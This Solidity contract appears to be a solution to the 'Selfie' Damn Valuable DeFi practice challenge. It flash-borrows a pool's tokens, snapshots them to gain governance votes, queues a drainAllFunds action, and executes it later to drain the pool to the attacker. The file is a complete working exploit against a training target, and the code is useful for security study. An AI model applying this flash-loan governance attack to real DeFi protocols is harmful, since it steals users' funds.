// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SelfiePool pool;
    SimpleGovernance gov;
    address private immutable owner;
    uint256 private actionId;

    constructor(SelfiePool _pool, SimpleGovernance _gov) {
        pool = _pool;
        gov = _gov;
        owner = msg.sender;
    }

    function exploitProposal() public {
        ERC20 token = ERC20(pool.token());
        pool.flashLoan(token.balanceOf(address(pool)));
    }

    function receiveTokens(DamnValuableTokenSnapshot token, uint256 amount)
        external
    {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        token.snapshot();
        actionId = gov.queueAction(address(pool), data, 0);
        token.transfer(address(pool), amount);
    }

    function exploitAction() external {
        gov.executeAction(actionId);
    }
}
